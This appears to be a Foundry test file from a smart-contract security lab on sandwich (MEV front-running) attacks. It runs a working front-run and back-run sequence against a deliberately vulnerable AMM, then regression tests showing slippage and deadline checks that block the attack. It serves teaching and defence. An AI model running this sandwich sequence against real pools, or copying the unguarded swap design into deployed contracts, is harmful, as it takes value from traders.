// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableAmm, IERC20} from "../src/VulnerableAmm.sol";
import {SafeAmm} from "../src/SafeAmm.sol";

/// @title Sandwich.t.sol
/// @notice Lab 06 — Exploit + regression test for sandwich / MEV
///         front-running.
///
/// Lab: Sandwich attack (transaction order dependence)
///
/// Threat model:
///   The AMM executes swaps at whatever price is live when the
///   transaction lands. A searcher watching the mempool can front-run a
///   victim's swap (moving the price), let the victim trade at the moved
///   price, then back-run to close the position — profiting from the
///   victim's slippage.
///
/// Violated invariant:
///   "A trader receives the price they expected when they signed."
///   With no `minAmountOut` and no deadline, the executed price is fully
///   controlled by whoever orders transactions around it.
///
/// Reproduction (pool seeded 100 A / 100 B, victim swaps 10 A for B):
///   1. Attacker front-runs: swaps 50 A -> 33.27 B (price of B rises).
///   2. Victim lands: receives ~4.16 B instead of the fair ~9.07 B.
///   3. Attacker back-runs: sells 33.27 B -> ~55.42 A.
///   Net: attacker +5.42 A, victim -4.9 B vs fair price.
///
/// Remediation:
///   `SafeAmm.swap` enforces `minAmountOut` (reverts when the executed
///   price is worse than the bound) and `deadline`. The front-run makes
///   the victim's transaction revert instead of executing, and the
///   sandwicher's round trip pays the pool fee twice.
///
/// Regression test:
///   - The sandwich on SafeAmm cannot execute: victim reverts, attacker
///     round trip is a net loss.
///   - Stale `deadline` reverts.
contract SandwichTest is Test {
    MinimalToken internal tokenA;
    MinimalToken internal tokenB;
    VulnerableAmm internal vulnerable;
    SafeAmm internal safe;

    uint256 internal constant LP_A = 100 ether;
    uint256 internal constant LP_B = 100 ether;
    uint256 internal constant VICTIM_IN = 10 ether;
    uint256 internal constant ATTACKER_IN = 50 ether;
    uint256 internal constant DEADLINE_BUFFER = 1 hours;

    address internal victim;

    function setUp() public {
        tokenA = new MinimalToken("Token A", "TKA");
        tokenB = new MinimalToken("Token B", "TKB");
        vulnerable = new VulnerableAmm(address(tokenA), address(tokenB));
        safe = new SafeAmm(address(tokenA), address(tokenB));

        address lp = makeAddr("lp");
        tokenA.mint(lp, 2 * LP_A);
        tokenB.mint(lp, 2 * LP_B);
        vm.startPrank(lp);
        tokenA.approve(address(vulnerable), type(uint256).max);
        tokenB.approve(address(vulnerable), type(uint256).max);
        tokenA.approve(address(safe), type(uint256).max);
        tokenB.approve(address(safe), type(uint256).max);
        vulnerable.addLiquidity(LP_A, LP_B);
        safe.addLiquidity(LP_A, LP_B);
        vm.stopPrank();

        victim = makeAddr("victim");
        tokenA.mint(victim, VICTIM_IN);
        tokenA.mint(address(this), ATTACKER_IN * 10);
        tokenB.mint(address(this), ATTACKER_IN * 10);
        tokenA.approve(address(vulnerable), type(uint256).max);
        tokenB.approve(address(vulnerable), type(uint256).max);
        tokenA.approve(address(safe), type(uint256).max);
        tokenB.approve(address(safe), type(uint256).max);
        vm.startPrank(victim);
        tokenA.approve(address(vulnerable), type(uint256).max);
        tokenA.approve(address(safe), type(uint256).max);
        vm.stopPrank();
    }

    /// @notice Mempool order is simulated by call order within the test.
    function testVulnerableAmmIsSandwiched() public {
        uint256 fairOut = vulnerable.getAmountOut(VICTIM_IN, LP_A, LP_B);

        // 1. Attacker front-runs the victim.
        uint256 attackerPosition = vulnerable.swap(ATTACKER_IN, true);
        // 2. Victim lands at the moved price.
        vm.prank(victim);
        uint256 victimOut = vulnerable.swap(VICTIM_IN, true);
        // 3. Attacker back-runs their exact sandwich position.
        uint256 backRunOut = vulnerable.swap(attackerPosition, false);

        // Victim lost ~54% to the sandwich.
        assertLt(victimOut, fairOut, "victim must receive less than fair");
        assertGt(fairOut - victimOut, fairOut / 2, "slippage should exceed 50%");

        // Attacker closed the round trip in profit.
        assertGt(backRunOut, ATTACKER_IN, "sandwich must be profitable");
        assertGt(tokenA.balanceOf(address(this)), ATTACKER_IN);
    }

    function testSafeAmmBlocksSandwich() public {
        uint256 fairOut = safe.getAmountOut(VICTIM_IN, LP_A, LP_B);
        uint256 deadline = block.timestamp + DEADLINE_BUFFER;

        // 1. Attacker front-runs anyway (their own trade is protected
        //    by their own bound, so it still executes).
        uint256 frontRunOut = safe.swap(ATTACKER_IN, true, safe.getAmountOut(ATTACKER_IN, LP_A, LP_B), deadline);

        // 2. Victim's transaction reverts instead of executing at a bad price.
        uint256 squeezedOut = safe.getAmountOut(VICTIM_IN, LP_A + ATTACKER_IN, LP_B - frontRunOut);
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(SafeAmm.SlippageExceeded.selector, fairOut - 0.5 ether, squeezedOut));
        safe.swap(VICTIM_IN, true, fairOut - 0.5 ether, deadline);

        // 3. Without a victim to pay for the round trip, the sandwicher
        //    pays the pool fee twice.
        uint256 backRunOut = safe.swap(frontRunOut, false, 0, deadline);
        assertLt(backRunOut, ATTACKER_IN, "unmatched round trip must lose the fee");
    }

    function testSafeAmmRevertsOnExpiredDeadline() public {
        vm.warp(block.timestamp + DEADLINE_BUFFER + 1);
        vm.expectRevert(abi.encodeWithSelector(SafeAmm.Expired.selector, 0, block.timestamp));
        safe.swap(1 ether, true, 0, 0);
    }
}

/// @notice Minimal ERC20-ish token used to exercise the AMM labs.
contract MinimalToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
